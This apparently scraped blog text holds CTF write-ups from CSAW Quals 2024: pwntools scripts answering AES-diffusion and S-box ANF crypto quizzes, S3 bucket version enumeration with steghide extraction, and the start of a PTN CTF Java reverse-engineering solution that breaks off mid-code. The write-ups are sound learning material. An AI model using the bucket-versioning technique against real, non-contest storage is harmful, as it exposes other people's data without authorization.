[\u0026#34;x2\u0026#34;, \u0026#34;x6\u0026#34;, \u0026#34;x10\u0026#34;, \u0026#34;x14\u0026#34;], [\u0026#34;x3\u0026#34;, \u0026#34;x7\u0026#34;, \u0026#34;x11\u0026#34;, \u0026#34;x15\u0026#34;]] def AESRound(state): return MixColumns(ShiftRows(state)) def AES(state, rounds): for r in range(rounds): state = AESRound(state) return state PrettyPrint(AES(state,2)) The Python code simulates parts of the AES (Advanced Encryption Standard) encryption process, specifically focusing on ShiftRows and MixColumns operations. Here\u0026rsquo;s a short explanation:\nKey Operations: ShiftRows:\nEach row of the 4x4 state matrix is shifted to the left by a certain number of positions, where the first row is not shifted, the second row is shifted by 1 position, and so on. MixColumns:\nEach column of the state matrix is multiplied by a fixed 4x4 matrix using modular arithmetic (though here, the code generates string expressions to represent this multiplication). Functions: ShiftRows(state): Shifts rows of the state matrix cyclically. MixColumns(state): Mixes the columns of the matrix by multiplying each with a fixed transformation matrix. AESRound(state): Performs one round of AES by applying ShiftRows and MixColumns. AES(state, rounds): Runs multiple rounds of AES on the state matrix. Example: The code initializes a 4x4 matrix (the state) with symbolic values (x0, x1, \u0026hellip;, x15), performs 2 rounds of AES, and prints the final matrix.\nThe goal is to simulate the AES encryption transformations in a simplified, symbolic way, without performing actual byte-level encryption.\nExploit I will write a Python script using the pwntools library to exploit the AES diffusion challenge. First, I will connect to the server using nc diffusion.ctf.csaw.io 5000. Once connected, I will send the following input matrix that simulates part of the AES encryption process:\n[[\u0026#39;x0\u0026#39;, \u0026#39;x4\u0026#39;, \u0026#39;x8\u0026#39;, \u0026#39;x12\u0026#39;], [\u0026#39;x5\u0026#39;, \u0026#39;x9\u0026#39;, \u0026#39;x13\u0026#39;, \u0026#39;x1\u0026#39;], [\u0026#39;x10\u0026#39;, \u0026#39;x14\u0026#39;, \u0026#39;x2\u0026#39;, \u0026#39;x6\u0026#39;], [\u0026#39;x15\u0026#39;, \u0026#39;x3\u0026#39;, \u0026#39;x7\u0026#39;, \u0026#39;x11\u0026#39;]] After that, I will input the matrix transformation that applies the MixColumns step in AES. This will look like:\n[[\u0026#39;2*x0 + 3*x5 + 1*x10 + 1*x15\u0026#39;, ... (more matrixes here)] Then, I will provide the variables to simulate column mixing and input their respective values. I will also confirm that no other operations need to be done and set a few of the variables to zero to influence the output.\nFinally, after providing a formula for transformation and confirming that I do not need further diffusion, I will receive the correct output and retrieve the flag, which will complete the challenge. So our final script is:\nfrom pwn import * p=remote(\u0026#34;diffusion.ctf.csaw.io\u0026#34;,5000) p.sendlineafter(\u0026#34;answer\u0026#34;,\u0026#34;[[\u0026#39;x0\u0026#39;, \u0026#39;x4\u0026#39;, \u0026#39;x8\u0026#39;, \u0026#39;x12\u0026#39;], [\u0026#39;x5\u0026#39;, \u0026#39;x9\u0026#39;, \u0026#39;x13\u0026#39;, \u0026#39;x1\u0026#39;], [\u0026#39;x10\u0026#39;, \u0026#39;x14\u0026#39;, \u0026#39;x2\u0026#39;, \u0026#39;x6\u0026#39;], [\u0026#39;x15\u0026#39;, \u0026#39;x3\u0026#39;, \u0026#39;x7\u0026#39;, \u0026#39;x11\u0026#39;]]\u0026#34;) p.sendlineafter(\u0026#34;answer\u0026#34;,\u0026#34;[[\u0026#39;2*x0 + 3*x5 + 1*x10 + 1*x15\u0026#39;, \u0026#39;2*x4 + 3*x9 + 1*x14 + 1*x3\u0026#39;, \u0026#39;2*x8 + 3*x13 + 1*x2 + 1*x7\u0026#39;, \u0026#39;2*x12 + 3*x1 + 1*x6 + 1*x11\u0026#39;], [\u0026#39;1*x0 + 2*x5 + 3*x10 + 1*x15\u0026#39;, \u0026#39;1*x4 + 2*x9 + 3*x14 + 1*x3\u0026#39;, \u0026#39;1*x8 + 2*x13 + 3*x2 + 1*x7\u0026#39;, \u0026#39;1*x12 + 2*x1 + 3*x6 + 1*x11\u0026#39;], [\u0026#39;1*x0 + 1*x5 + 2*x10 + 3*x15\u0026#39;, \u0026#39;1*x4 + 1*x9 + 2*x14 + 3*x3\u0026#39;, \u0026#39;1*x8 + 1*x13 + 2*x2 + 3*x7\u0026#39;, \u0026#39;1*x12 + 1*x1 + 2*x6 + 3*x11\u0026#39;], [\u0026#39;3*x0 + 1*x5 + 1*x10 + 2*x15\u0026#39;, \u0026#39;3*x4 + 1*x9 + 1*x14 + 2*x3\u0026#39;, \u0026#39;3*x8 + 1*x13 + 1*x2 + 2*x7\u0026#39;, \u0026#39;3*x12 + 1*x1 + 1*x6 + 2*x11\u0026#39;]]\u0026#34;) p.sendlineafter(\u0026#34;al order\u0026#34;,\u0026#34;x0,x5,x10,x15\u0026#34;) p.sendlineafter(\u0026#34;al order\u0026#34;,\u0026#34;x2,x7,x8,x13\u0026#34;) p.sendlineafter(\u0026#34;(yes/no)\u0026#34;,\u0026#34;no\u0026#34;) p.sendlineafter(\u0026#34;answer\u0026#34;,\u0026#34;12\u0026#34;) p.sendlineafter(\u0026#34;al order\u0026#34;,\u0026#34;x0:1,x5:1,x10:1,x15:1\u0026#34;) p.sendlineafter(\u0026#34;al order\u0026#34;,\u0026#34;x0:0,x1:0,x2:0,x3:0,x4:0,x5:0,x6:0,x7:0,x8:0,x9:0,x10:0,x11:0,x12:0,x13:0,x14:0,x15:0\u0026#34;) p.sendlineafter(\u0026#34;al order\u0026#34;,\u0026#34;x0\u0026#34;) p.sendlineafter(\u0026#34;tor code\u0026#34;,\u0026#34;(2*(2*x0 + 3*x1 + 1*x2 + 1*x3) + 3*(1*x0 + 2*x1 + 3*x2 + 1*x3) + 1*(1*x0 + 1*x1 + 2*x2 + 3*x3) + 1*(3*x0 + 1*x1 + 1*x2 + 2*x3))\u0026#34;) p.sendlineafter(\u0026#34;iffusion?\u0026#34;,\u0026#34;no\u0026#34;) print(p.recvall()) And there we go, we have the flag as csawctf{1_n0w_und3r5t4nd_435_d1ffu510n}.\nDiffusion Pop Quiz (Crypto) Here we are given ans_extractor.py:\n# To ensure correctly formatted answers for the challenge, use 1-indexed values for the output bits. # For example, if you have an S-Box of 8 bits to 8 bits, the first output bit is 1, the second is 2, and so forth. # Your ANF expression will have the variables y1, y2, ..., y8. # Put your S-Boxes here. example = [1, 0, 0, 0, 1, 1, 1, 0] # 3 input bits: 000, 001, 010, 011, 100, 101, 110, 111 # Array indexes: 0 1 2 3 4 5 6 7 # f(x1,x2,x3): 0 1 0 0 0 1 1 1 # Customize the following settings to extract specific bits of specific S-Boxes and have a comfortable visualization of terms. SYMBOL = \u0026#39;x\u0026#39; INPUT_BITS = 3 OUTPUT_BITS = 1 SBOX = example BIT = 1 # Ignore the functions, we\u0026#39;ve implemented this for you to save your time. # Don\u0026#39;t touch it, it might break and we don\u0026#39;t want that, right? ;) def get_sbox_result(input_int): return SBOX[input_int] def get_term(binary_string): term = \u0026#34;\u0026#34; i = 1 for (count,bit) in enumerate(binary_string): if bit == \u0026#34;1\u0026#34;: term += SYMBOL+str(i)+\u0026#34;*\u0026#34; i += 1 if term == \u0026#34;\u0026#34;: return \u0026#34;1\u0026#34; return term[:-1] def get_poly(inputs, outputs): poly = \u0026#34;\u0026#34; for v in inputs: if outputs[v]: poly += get_term(v) + \u0026#34;+\u0026#34; return poly[:-1] def should_sum(u, v, n): for i in range(n): if u[i] \u0026gt; v[i]: return False return True def get_as(vs, f, n): a = {} for v in vs: a[v] = 0 for u in vs: if should_sum(u, v, n): a[v] ^= f[u] return a def get_anf(vs, f, n): return get_poly(vs, get_as(vs, f, n)) def get_vs_and_fis_from_sbox(which_fi): vs = [] fis = {} for input_integer in range(2**INPUT_BITS): sbox_output = get_sbox_result(input_integer) input_integer_binary = bin(input_integer)[2:].zfill(INPUT_BITS) fis[input_integer_binary] = 0 sbox_output_binary = bin(sbox_output)[2:].zfill(OUTPUT_BITS) vs.append(input_integer_binary) fis[input_integer_binary] = int(sbox_output_binary[which_fi-1]) return vs, fis def get_anf_from_sbox_fi(which_fi): vs, fis = get_vs_and_fis_from_sbox(which_fi) poly = get_anf(vs, fis, INPUT_BITS) return poly output = get_anf_from_sbox_fi(BIT) print(output) This code generates the Algebraic Normal Form (ANF) of a Boolean function corresponding to the output bit(s) of an S-Box. Here\u0026rsquo;s an explanation:\nKey Concepts: S-Box: A substitution box used in cryptographic algorithms to perform a substitution of input bits with output bits. It\u0026rsquo;s a non-linear mapping of input to output. ANF (Algebraic Normal Form): A way to represent Boolean functions using XOR and AND operations. ANF expressions are polynomials with binary coefficients (0 or 1). Input/Output Bits: The S-Box takes a fixed number of input bits and returns output bits. In this example, 3 input bits map to 1 output bit. Code Breakdown: Settings:\nSYMBOL = 'x': The variables used for the input bits (e.g., x1, x2, x3). INPUT_BITS = 3: The S-Box uses 3 input bits (x1, x2, x3), resulting in 8 possible input values (from 000 to 111). OUTPUT_BITS = 1: The S-Box outputs 1 bit. SBOX = example: The example S-Box provides a mapping of the 8 possible input values to 1 output bit each. ANF Extraction Process:\nget_sbox_result(input_int): Returns the S-Box output for a given input. get_term(binary_string): Converts a binary input string (e.g., 001) to a polynomial term (e.g., x2). get_poly(inputs, outputs): Constructs the ANF polynomial from the terms that contribute to the output. get_vs_and_fis_from_sbox(which_fi): Extracts input-output pairs for the S-Box and identifies which output bit is being analyzed (based on BIT). get_anf(vs, f, n): Combines input-output relationships into the ANF expression using XOR and AND operations. The Process:\nThe code analyzes the S-Box example, which maps 3 input bits to 1 output bit. For each input bit pattern (from 000 to 111), it checks the corresponding output bit and builds an ANF representation for that output bit. The final output is a polynomial representing the selected output bit in ANF form. Example: If we have the following example S-Box:\nexample = [1, 0, 0, 0, 1, 1, 1, 0] # 3 input bits -\u0026gt; 1 output bit For input 000, the S-Box outputs 1. For input 001, it outputs 0, and so on.\nThe goal of the script is to generate a Boolean polynomial for the output bit of the S-Box, based on the input bits.\nOutput: The script prints the ANF expression for the given output bit. For the example provided, the expression might look something like:\nx1*x2 + x3 + 1 This indicates that the output bit depends on a combination of the input bits in this particular form.\nExploit To exploit the diffusion challenge at diffusion-pop-quiz.ctf.csaw.io, I will connect to the server and interact with it based on the specific prompts provided.\nFirst, I will establish a connection using pwn and input my initial response when prompted. The remote server will ask for an answer to a question, and I will respond with “a”. Following this, I will encounter a query about the answer being correct, to which I will respond with “no”.\nNext, when the server asks, “Diffusion matters a lot, right?”, I will send the reply, “Diffusion matters a lot”. Once prompted with the hexadecimal number, I will enter '0x16'.\nThe server will then ask for Boolean expressions. I will systematically input the appropriate expressions, starting with:\nx3+x2*x3+x1*x2 Then, repeat x3+x2*x3+x1*x2. I will follow this up with the larger expression: 1+x3+x2+x2*x3+x1*x3+x1*x2. The final large Boolean expression will be quite complex, but I will input it in response to the server’s prompts.\nFor the last few steps, I will input the variable order as x1,x2,x3,x4,x5,x6,x7,x8 and respond with \u0026ldquo;yes\u0026rdquo; when the server asks for confirmation.\nThe server will continue to prompt me for more Boolean expressions, to which I will provide the appropriate responses. With all these our final script is:\nfrom pwn import * p=remote(\u0026#34;diffusion-pop-quiz.ctf.csaw.io\u0026#34;,5000) p.sendlineafter(\u0026#34;?\u0026#34;,\u0026#34;a\u0026#34;) p.sendlineafter(\u0026#34;)\u0026#34;,\u0026#34;no\u0026#34;) p.sendlineafter(\u0026#34;?\u0026#34;,\u0026#34;Diffusion matters a lot\u0026#34;) p.sendlineafter(\u0026#34;with the 0x\u0026#34;,\u0026#39;0x16\u0026#39;) p.sendlineafter(\u0026#34;given you\u0026#34;,\u0026#39;x3+x2*x3+x1*x2\u0026#39;) p.sendlineafter(\u0026#34;given you\u0026#34;,\u0026#39;x3+x2*x3+x1*x2\u0026#39;) p.sendlineafter(\u0026#34;given you\u0026#34;,\u0026#39;1+x3+x2+x2*x3+x1*x3+x1*x2\u0026#39;) p.sendlineafter(\u0026#34;given you\u0026#34;,\u0026#39;x8+x7+x6+x5+x5*x6+x5*x6*x8+x5*x6*x7*x8+x4*x7+x4*x7*x8+x4*x6*x8+x4*x6*x7*x8+x4*x5*x7*x8+x4*x5*x6*x8+x3*x7+x3*x7*x8+x3*x6+x3*x6*x7+x3*x6*x7*x8+x3*x5*x7+x3*x5*x6*x8+x3*x5*x6*x7*x8+x3*x4+x3*x4*x8+x3*x4*x7+x3*x4*x7*x8+x3*x4*x6+x3*x4*x6*x7+x3*x4*x6*x7*x8+x3*x4*x5*x8+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x3*x4*x5*x6*x7*x8+x2+x2*x8+x2*x7+x2*x7*x8+x2*x6+x2*x6*x7*x8+x2*x5*x7*x8+x2*x5*x6+x2*x5*x6*x8+x2*x4+x2*x4*x7*x8+x2*x4*x6*x7+x2*x4*x5*x8+x2*x4*x5*x6+x2*x4*x5*x6*x8+x2*x4*x5*x6*x7+x2*x3+x2*x3*x8+x2*x3*x7+x2*x3*x7*x8+x2*x3*x6*x7*x8+x2*x3*x5+x2*x3*x5*x8+x2*x3*x5*x7+x2*x3*x5*x6+x2*x3*x4+x2*x3*x4*x8+x2*x3*x4*x6*x8+x2*x3*x4*x6*x7*x8+x2*x3*x4*x5*x7+x1*x8+x1*x7+x1*x7*x8+x1*x6+x1*x6*x8+x1*x6*x7+x1*x6*x7*x8+x1*x5+x1*x5*x8+x1*x5*x7+x1*x5*x7*x8+x1*x5*x6+x1*x5*x6*x8+x1*x5*x6*x7+x1*x5*x6*x7*x8+x1*x4+x1*x4*x8+x1*x4*x7+x1*x4*x7*x8+x1*x4*x6+x1*x4*x6*x8+x1*x4*x6*x7+x1*x4*x6*x7*x8+x1*x4*x5+x1*x4*x5*x8+x1*x4*x5*x7+x1*x4*x5*x7*x8+x1*x4*x5*x6+x1*x4*x5*x6*x8+x1*x4*x5*x6*x7+x1*x4*x5*x6*x7*x8+x1*x3*x5*x8+x1*x3*x5*x7*x8+x1*x3*x5*x6*x8+x1*x3*x5*x6*x7*x8+x1*x3*x4*x5*x8+x1*x3*x4*x5*x7*x8+x1*x3*x4*x5*x6*x8+x1*x3*x4*x5*x6*x7*x8+x1*x2+x1*x2*x8+x1*x2*x7+x1*x2*x7*x8+x1*x2*x6+x1*x2*x6*x8+x1*x2*x6*x7+x1*x2*x6*x7*x8+x1*x2*x5+x1*x2*x5*x8+x1*x2*x5*x7+x1*x2*x5*x7*x8+x1*x2*x5*x6+x1*x2*x5*x6*x8+x1*x2*x5*x6*x7+x1*x2*x5*x6*x7*x8+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3*x5*x8+x1*x2*x3*x5*x7*x8+x1*x2*x3*x4*x5*x6*x8\u0026#39;) p.sendlineafter(\u0026#34;merical order\\r\\n\u0026#34;,\u0026#34;x1,x2,x3,x4,x5,x6,x7,x8\u0026#34;) p.sendlineafter(\u0026#34;)\u0026#34;,\u0026#34;yes\u0026#34;) p.sendlineafter(\u0026#34;given you\u0026#34;,\u0026#39;x7*x8+x6+x6*x7*x8+x5*x7+x5*x6+x5*x6*x7+x4*x7+x4*x6*x7+x4*x6*x7*x8+x4*x5+x4*x5*x7+x4*x5*x6*x8+x4*x5*x6*x7+x3+x3*x7*x8+x3*x6*x7+x3*x5*x8+x3*x5*x7+x3*x5*x7*x8+x3*x5*x6+x3*x5*x6*x7+x3*x5*x6*x7*x8+x3*x4*x6*x8+x3*x4*x6*x7+x3*x4*x5+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x3*x4*x5*x6*x7*x8+x2+x2*x8+x2*x7*x8+x2*x6*x8+x2*x6*x7+x2*x6*x7*x8+x2*x5+x2*x5*x8+x2*x5*x7*x8+x2*x4+x2*x4*x8+x2*x4*x6+x2*x4*x6*x8+x2*x4*x6*x7+x2*x4*x6*x7*x8+x2*x4*x5*x8+x2*x4*x5*x7*x8+x2*x4*x5*x6*x8+x2*x4*x5*x6*x7*x8+x2*x3*x7+x2*x3*x6+x2*x3*x6*x7*x8+x2*x3*x5*x8+x2*x3*x5*x6+x2*x3*x5*x6*x8+x2*x3*x5*x6*x7*x8+x2*x3*x4*x6+x2*x3*x4*x6*x7+x2*x3*x4*x5*x7+x2*x3*x4*x5*x7*x8+x2*x3*x4*x5*x6*x8+x2*x3*x4*x5*x6*x7+x1*x7+x1*x7*x8+x1*x6*x8+x1*x5+x1*x5*x7+x1*x5*x7*x8+x1*x5*x6*x7+x1*x5*x6*x7*x8+x1*x4*x7*x8+x1*x4*x6*x7+x1*x4*x5*x7+x1*x4*x5*x7*x8+x1*x4*x5*x6*x7+x1*x4*x5*x6*x7*x8+x1*x3+x1*x3*x8+x1*x3*x7+x1*x3*x7*x8+x1*x3*x6*x8+x1*x3*x5*x7+x1*x3*x5*x6+x1*x3*x5*x6*x7+x1*x3*x5*x6*x7*x8+x1*x3*x4+x1*x3*x4*x8+x1*x3*x4*x7+x1*x3*x4*x7*x8+x1*x3*x4*x6+x1*x3*x4*x6*x7*x8+x1*x3*x4*x5*x7+x1*x3*x4*x5*x6+x1*x2+x1*x2*x8+x1*x2*x7+x1*x2*x6+x1*x2*x5*x6*x7*x8+x1*x2*x4*x7*x8+x1*x2*x4*x6*x8+x1*x2*x4*x5+x1*x2*x4*x5*x7+x1*x2*x4*x5*x6+x1*x2*x4*x5*x6*x8+x1*x2*x4*x5*x6*x7+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3+x1*x2*x3*x8+x1*x2*x3*x6*x7+x1*x2*x3*x5+x1*x2*x3*x5*x8+x1*x2*x3*x5*x6*x8+x1*x2*x3*x5*x6*x7+x1*x2*x3*x4*x6*x8+x1*x2*x3*x4*x5+x1*x2*x3*x4*x5*x8+x1*x2*x3*x4*x5*x7*x8+x1*x2*x3*x4*x5*x6*x8\u0026#39;) p.sendlineafter(\u0026#34;merical order\\r\\n\u0026#34;,\u0026#34;x1,x2,x3,x4,x5,x6,x7,x8\u0026#34;) p.sendlineafter(\u0026#34;)\u0026#34;,\u0026#34;yes\u0026#34;) p.sendlineafter(\u0026#34;given you\u0026#34;,\u0026#39;x8+x7+x6*x8+x5*x8+x5*x7*x8+x5*x6+x5*x6*x8+x4*x8+x4*x7+x4*x7*x8+x4*x6*x8+x4*x6*x7+x4*x5+x4*x5*x8+x4*x5*x7+x4*x5*x7*x8+x4*x5*x6+x4*x5*x6*x8+x4*x5*x6*x7+x4*x5*x6*x7*x8+x3+x3*x8+x3*x7*x8+x3*x6*x8+x3*x6*x7+x3*x6*x7*x8+x3*x5*x8+x3*x5*x7+x3*x5*x7*x8+x3*x5*x6*x8+x3*x5*x6*x7+x3*x5*x6*x7*x8+x3*x4*x8+x3*x4*x7+x3*x4*x6+x3*x4*x6*x7*x8+x3*x4*x5+x3*x4*x5*x6*x7+x3*x4*x5*x6*x7*x8+x2*x8+x2*x7*x8+x2*x6*x7+x2*x5*x8+x2*x5*x7*x8+x2*x5*x6+x2*x5*x6*x7+x2*x5*x6*x7*x8+x2*x4*x8+x2*x4*x7*x8+x2*x4*x6*x8+x2*x4*x5+x2*x4*x5*x8+x2*x4*x5*x7*x8+x2*x4*x5*x6+x2*x4*x5*x6*x7+x2*x4*x5*x6*x7*x8+x2*x3+x2*x3*x7+x2*x3*x7*x8+x2*x3*x5+x2*x3*x5*x8+x2*x3*x5*x6+x2*x3*x5*x6*x7*x8+x2*x3*x4*x6+x2*x3*x4*x6*x8+x2*x3*x4*x6*x7+x2*x3*x4*x6*x7*x8+x2*x3*x4*x5+x2*x3*x4*x5*x7+x2*x3*x4*x5*x6*x8+x1+x1*x8+x1*x7*x8+x1*x6*x8+x1*x6*x7+x1*x6*x7*x8+x1*x5*x8+x1*x5*x7+x1*x5*x6+x1*x5*x6*x8+x1*x5*x6*x7*x8+x1*x4+x1*x4*x8+x1*x4*x7+x1*x4*x6*x8+x1*x4*x6*x7+x1*x4*x6*x7*x8+x1*x4*x5*x8+x1*x4*x5*x7*x8+x1*x4*x5*x6+x1*x4*x5*x6*x8+x1*x4*x5*x6*x7*x8+x1*x3*x8+x1*x3*x7+x1*x3*x6*x7+x1*x3*x6*x7*x8+x1*x3*x5*x8+x1*x3*x5*x7+x1*x3*x5*x7*x8+x1*x3*x5*x6*x8+x1*x3*x4*x7+x1*x3*x4*x6+x1*x3*x4*x6*x7+x1*x3*x4*x6*x7*x8+x1*x3*x4*x5*x8+x1*x3*x4*x5*x7*x8+x1*x3*x4*x5*x6*x7+x1*x2+x1*x2*x8+x1*x2*x6+x1*x2*x6*x7+x1*x2*x6*x7*x8+x1*x2*x5*x7+x1*x2*x5*x7*x8+x1*x2*x5*x6*x7+x1*x2*x4+x1*x2*x4*x7*x8+x1*x2*x4*x6+x1*x2*x4*x6*x7+x1*x2*x4*x5*x7+x1*x2*x4*x5*x7*x8+x1*x2*x4*x5*x6+x1*x2*x4*x5*x6*x8+x1*x2*x4*x5*x6*x7+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3*x7+x1*x2*x3*x6+x1*x2*x3*x6*x8+x1*x2*x3*x5+x1*x2*x3*x5*x8+x1*x2*x3*x5*x7+x1*x2*x3*x5*x7*x8+x1*x2*x3*x5*x6+x1*x2*x3*x5*x6*x8+x1*x2*x3*x5*x6*x7*x8+x1*x2*x3*x4+x1*x2*x3*x4*x8+x1*x2*x3*x4*x7+x1*x2*x3*x4*x7*x8+x1*x2*x3*x4*x6*x8+x1*x2*x3*x4*x5+x1*x2*x3*x4*x5*x7*x8+x1*x2*x3*x4*x5*x6+x1*x2*x3*x4*x5*x6*x8+x1*x2*x3*x4*x5*x6*x7\u0026#39;) p.sendlineafter(\u0026#34;merical order\\r\\n\u0026#34;,\u0026#34;x1,x2,x3,x4,x5,x6,x7,x8\u0026#34;) p.sendlineafter(\u0026#34;)\u0026#34;,\u0026#34;yes\u0026#34;) p.sendlineafter(\u0026#34;)\u0026#34;,\u0026#34;no\u0026#34;) p.sendlineafter(\u0026#34;etc.\\r\\n\u0026#34;,\u0026#34;y7\u0026#34;) p.sendlineafter(\u0026#34;given you\u0026#34;,\u0026#39;x7+x6+x6*x8+x5*x8+x5*x6+x4*x8+x4*x7+x4*x7*x8+x4*x6*x7+x4*x5*x6+x4*x5*x6*x8+x4*x5*x6*x7+x4*x5*x6*x7*x8+x3*x7+x3*x6+x3*x6*x7+x3*x5+x3*x5*x6+x3*x4+x3*x4*x8+x3*x4*x7+x3*x4*x6*x8+x3*x4*x6*x7*x8+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x2*x8+x2*x7*x8+x2*x6+x2*x6*x7*x8+x2*x5*x7+x2*x5*x6+x2*x5*x6*x8+x2*x4*x8+x2*x4*x6+x2*x4*x6*x7+x2*x4*x6*x7*x8+x2*x4*x5*x8+x2*x4*x5*x7+x2*x4*x5*x6*x7+x2*x4*x5*x6*x7*x8+x2*x3*x8+x2*x3*x6*x8+x2*x3*x6*x7*x8+x2*x3*x5*x7+x2*x3*x5*x6*x8+x2*x3*x4\u0026#39;) p.sendlineafter(\u0026#34;etc.\\r\\n\u0026#34;,\u0026#34;x1\u0026#34;) p.sendlineafter(\u0026#34;)\u0026#34;,\u0026#34;yes\u0026#34;) p.sendlineafter(\u0026#34;)\u0026#34;,\u0026#34;yes\u0026#34;) print(p.recvall()) When we run the script, we receive the flag from the server output as:\nAnd our flag is csawctf{hopefu11y_+he_know1ed9e_diffu5ed_in+o_your_6r@in5}.\nBucketWars (Web) They gave us a site https://bucketwars.ctf.csaw.io. When attempting to access any incorrect path, you receive an error message with this S3 bucket link: https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/. This is actually a positive outcome, as we now have the bucket link. We can use this information to enumerate further and search for potential misconfigurations.\nA hint on the front page mentioned \u0026lsquo;past versions.\u0026rsquo; I looked up how to access S3 versions and discovered that appending /?versions to the end of the URL would reveal past versions of files in the bucket.\nAs shown here: https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/?versions, you can see not only the files that are primarily on the main website but also some version IDs.\nFrom that XML file, I obtained several versionId values, which I used in the link as shown below: I replaced all those versionId in the following link: https://bucketwars.ctf.csaw.io.s3.amazonaws.com/index_v1.html?versionId=VersionId\nOut of all, https://bucketwars.ctf.csaw.io.s3.amazonaws.com/index_v1.html?versionId=t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB gives us: I tried to crack down the passphrase for the given image but no luck. Then I tried to look for other versionId and got this password in DOM: I used this password with steghide tool like:\n╭─rezy@dev ~ ╰─➤ steghide extract -sf sand-pit-1345726_640.jpg -xf flag.txt -p versions_leaks_buckets_oh_my wrote extracted data to \u0026#34;flag.txt\u0026#34;. ╭─rezy@dev ~ ╰─➤ cat flag.txt csawctf{lEaKY_Bu4K3tz_oH_m3_04_mY!} Conclusion Thank you for reading my write-up for CSAW QUALS 2024. Happy hacking! :)\n","permalink":"http://localhost:1313/posts/ctf/csaw-quals-2024/","summary":"Welcome to the write-up of CSAW Quals 2024. This document details the CTF challenges I solved during the competition.\nThe Triple Illusion (Forensics) We were given three .png files. I used ExifTool on one and zsteg on the other two to extract some information from the files, as shown below for all of them.\n╭─rezy@dev ~/Desktop/images ╰─➤ exiftool datavsmetadata.png ExifTool Version Number : 12.76 File Name : datavsmetadata.png User Comment : Think about a two-input gate that outputs when inputs differ.","title":"CSAW Quals 2024"},{"content":"Hello guys, this year PTN is hosting 24 hour CTF competition in celebration of 11th Anniversary. The CTF is styled in jeopardy mode. So I, rezydev is playing this CTF with NCA1@Nepal. Let\u0026rsquo;s get into CTF writeup now.\nNo one goes empty handed! The CTF was supposed to be started at 3:00 PM NPT but we were supposed to register our team at 12:00 noon. So, I registered my team and was just looking around the website to read \u0026ldquo;CTF Competition Rules\u0026rdquo;. I have a habit of highlighting the text i read on screen. All I did was highlighted the whole text and found few letters which were hidden. Since the color code f7f7f7 is a very light shade of gray, few texts were hidden and I assembled all the hidden texts which gave me a flag: PTNCTF24{sanity_check}. And to be honest, I don\u0026rsquo;t know if this is just there or what as the CTF wasn\u0026rsquo;t started yet, but i can confirm it\u0026rsquo;s part of OSINT. Nvm, it was for \u0026ldquo;No one goes empty handed!\u0026rdquo;. Haha, so let\u0026rsquo;s go.\nI tried alot with OSINT \u0026amp; Web but no success, but for fun I tried reverse engineering.\nReverse Engineering E-reverse They gave us a file PasswordChecker.class which is a Java Class. I ran ghidra and put the file in it. This is the ghidra output:\n#include \u0026#34;out.h\u0026#34; // Flags: // ACC_PUBLIC // // public PasswordChecker() void \u0026lt;init\u0026gt;_void(PasswordChecker this) { this.\u0026lt;init\u0026gt;(); return; } // Flags: // ACC_PUBLIC // ACC_STATIC // // public static void main(java.lang.String[]) void main_java_lang_String___void(String[] param1) { PrintStream pPVar1; String pSVar2; boolean bVar3; Scanner objectRef; objectRef = new Scanner(System_in); pPVar1 = System_out; pPVar1.print(\u0026#34;Enter the password: \u0026#34;); pSVar2 = objectRef.nextLine(); bVar3 = PasswordChecker_checkPassword(pSVar2); if (bVar3) { pPVar1 = System_out; pPVar1.println(\u0026#34;Access granted!\u0026#34;); } else { pPVar1 = System_out; pPVar1.println(\u0026#34;Access denied!\u0026#34;); } objectRef.close(); return; } // Flags: // ACC_PRIVATE // ACC_STATIC // // private static boolean checkPassword(java.lang.String) boolean checkPassword_java_lang_String_boolean(String param1) { Base64_Decoder objectRef; byte[] pbVar1; String pSVar2; boolean bVar3; StringBuilder objectRef_00; StringBuilder pSVar4; dword pdVar5; int iVar6; int iVar7; int iVar8; objectRef_00 = new StringBuilder(); pdVar5 = PasswordChecker_ENCODED_PARTS; iVar6 = pdVar5.length; iVar7 = 0; while( true ) { if (iVar6 \u0026lt;= iVar7) break; pSVar2 = pdVar5[iVar7]; objectRef = Base64_getDecoder(); pbVar1 = objectRef.decode(pSVar2); iVar8 = PasswordChecker_SALTS.length; while (iVar8 = iVar8 + -1, -1 \u0026lt; iVar8) { pbVar1 = PasswordChecker_xorWithSalt(pbVar1,PasswordChecker_SALTS[iVar8]); } pSVar4 = objectRef_00; pSVar2 = new String(pbVar1); objectRef_00.append(pSVar2); iVar7 = iVar7 + 1; objectRef_00 = pSVar4; } pSVar2 = objectRef_00.toString(); bVar3 = pSVar2.equals(param1); return bVar3; } // Flags: // ACC_PRIVATE // ACC_STATIC // // private static byte[] xorWithSalt(byte[], byte) byte[] xorWithSalt_byte___byte_byte__(byte[] param1,byte param2) { byte[] pbVar1; int iVar2; pbVar1 = new byte[param1.length]; iVar2 = 0; while( true ) { if (param1.length \u0026lt;= iVar2) break; pbVar1[iVar2] = param1[iVar2] ^ param2; iVar2 = iVar2 + 1; } return pbVar1; } // Flags: // ACC_STATIC // // static (class initializer) void \u0026lt;clinit\u0026gt;_void(void) { String[] ppSVar1; byte[] pbVar2; ppSVar1 = new String[9]; ppSVar1[0] = \u0026#34;bGhyf2g=\u0026#34;; ppSVar1[1] = \u0026#34;eg4IR3Y=\u0026#34;; ppSVar1[2] = \u0026#34;CEoIYw0=\u0026#34;; ppSVar1[3] = \u0026#34;CWN6SXI=\u0026#34;; ppSVar1[4] = \u0026#34;YwgJYw0=\u0026#34;; ppSVar1[5] = \u0026#34;SAljWQg=\u0026#34;; ppSVar1[6] = \u0026#34;CUVjSAw=\u0026#34;; ppSVar1[7] = \u0026#34;Y05ZSlk=\u0026#34;; ppSVar1[8] = \u0026#34;TglZQQ==\u0026#34;; PasswordChecker_ENCODED_PARTS = ppSVar1; pbVar2 = new byte[4]; pbVar2[0] = 0x5a; pbVar2[1] = 0x3c; pbVar2[2] = 0x77; pbVar2[3] = 0x2d; PasswordChecker_SALTS = pbVar2; return; } I cleaned up the above code for java(ofcourse using AI):\nimport java.util.Base64; import java.util.Scanner; public class PasswordChecker { private static final String[] ENCODED_PARTS = { \u0026#34;bGhyf2g=\u0026#34;, \u0026#34;eg4IR3Y=\u0026#34;, \u0026#34;CEoIYw0=\u0026#34;, \u0026#34;CWN6SXI=\u0026#34;, 